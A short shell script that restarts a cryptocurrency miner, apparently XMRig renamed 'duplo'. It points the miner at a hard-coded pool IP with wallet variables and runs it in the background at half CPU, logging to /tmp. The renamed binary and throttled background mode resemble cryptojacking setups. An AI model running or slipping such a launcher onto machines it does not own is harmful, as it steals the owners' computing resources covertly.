pkill duplo
duplo -o 159.69.113.138:51268 -u $WALLET --pass=$PASSWORD --rig-id=$ID -B -l /tmp/duplo/duplo.log --donate-level=1 --print-time=60 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=50 --av=1 --variant -1
echo -e 'ALL WORKS! tail -f /tmp/duplo/duplo.log'